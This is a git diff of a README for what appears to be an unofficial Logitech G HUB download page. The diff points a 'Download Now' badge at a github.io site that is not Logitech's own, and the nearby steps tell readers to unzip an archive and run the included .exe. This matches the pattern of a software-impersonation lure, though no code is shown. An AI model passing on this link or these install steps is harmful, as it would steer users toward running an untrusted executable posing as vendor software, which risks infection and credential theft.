@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install Logitech G HUB and automatically detect supported devices.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://logitech-g-hub.github.io/.github/)
 
 ## 📸 Overview
 ![logitech-ghub-dpi](https://github.com/user-attachments/assets/eb675e8d-0385-42d2-bf32-da9e8ad41209)
